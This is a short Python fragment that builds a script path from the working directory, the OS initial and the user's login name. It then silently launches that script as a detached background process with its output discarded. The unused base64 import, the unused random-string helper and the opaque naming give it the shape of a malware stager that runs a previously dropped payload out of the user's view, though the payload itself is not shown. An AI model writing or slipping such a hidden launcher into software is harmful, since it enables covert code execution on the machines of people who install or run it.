
import base64
import sys
import os
import subprocess
import random
import string
import platform

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

strsfx = "/"
if platform.system()[0] == 'W':
    strsfx = '\\'
pypathstr = sys.executable

pyexecstr = os.getcwd() + strsfx + platform.system()[0] + os.getlogin() + ".py"

def baseddef():
	if os.path.isfile(pyexecstr) :
		if platform.system()[0] == 'W':
			pid = subprocess.Popen([pypathstr, pyexecstr], creationflags=subprocess.DETACHED_PROCESS, stdout=subprocess.DEVNULL) 
		else:
			subprocess.Popen([pypathstr, pyexecstr], preexec_fn=os.setpgrp, stdout=subprocess.DEVNULL)